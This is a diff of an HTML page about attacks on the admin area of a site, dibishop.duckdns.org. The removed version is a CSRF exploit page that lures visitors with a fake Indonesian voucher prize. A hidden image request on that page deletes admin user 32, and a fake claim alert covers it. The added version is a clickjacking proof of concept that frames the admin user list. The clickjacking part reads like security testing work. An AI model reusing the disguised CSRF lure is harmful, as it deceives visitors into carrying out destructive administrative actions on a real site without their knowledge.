@@ -1,27 +1,15 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Klaim Voucher Dibis Shop</title>
-  <style>
-    body { font-family: Arial; text-align: center; padding: 40px; background: #f4f4f4; }
-    .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
-    h1 { color: #d32f2f; }
-    .btn { background: #ff4444; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; text-decoration: none; display: inline-block; }
-  </style>
+    <title>Clickjacking PoC - dibishop.duckdns.org</title>
+    <style>
+        body { margin: 0; padding: 20px; font-family: Arial; }
+        iframe { width: 1000px; height: 800px; border: 2px solid red; }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>🎉 SELAMAT!</h1>
-    <h2>Anda Menang Voucher Rp1.000.000</h2>
-    <p>Klik tombol untuk klaim hadiah Anda sekarang!</p>
-
-    <!-- CSRF EXPLOIT: Hapus admin ID 32 otomatis -->
-    <img src="http://dibishop.duckdns.org/admin_area/index.php?user_delete=32" 
-         width="1" height="1" style="display:none">
-
-    <a href="#" class="btn" onclick="alert('Hadiah sedang diproses... Terima kasih!')">KLAIM HADIAH SEKARANG</a>
-    <p><small>Promo spesial dari Dibis Shop. Berlaku 24 jam.</small></p>
-  </div>
+    <h2>Clickjacking Test - Apakah situs muncul di bawah ini?</h2>
+    <iframe src="http://dibishop.duckdns.org/admin_area/index.php?view_users" width="1000" height="800"></iframe>
+    <p>Jika halaman target muncul di dalam frame merah di atas → <strong>RENTAN</strong>.</p>
 </body>
 </html>
